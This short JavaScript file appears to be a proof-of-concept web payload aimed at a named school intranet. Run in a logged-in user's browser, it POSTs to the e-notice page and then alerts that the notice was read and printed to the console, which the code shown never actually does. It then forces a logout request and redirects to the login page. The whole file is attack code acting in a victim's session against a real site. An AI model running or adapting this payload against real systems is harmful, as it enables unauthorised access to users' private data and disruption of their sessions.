alert("Current environment: intranet.icqm.edu.hk")
fetch('https://intranet.icqm.edu.hk/home/eService/notice/', {
    method: 'POST',
    headers: {
        'Accept': ' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type': 'text/html; charset=utf-8'
    }
})
   .then(Response => alert("Your e-notice had been accessed by this JS file, and printed in your browser's console."))
fetch('https://intranet.icqm.edu.hk/logout.php', {
    method: 'POST',
    headers: {
        'Accept': ' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type': 'text/html; charset=utf-8'
    }
})
alert("Logged Out.")
window.location.replace("https://intranet.icqm.edu.hk/index.php");
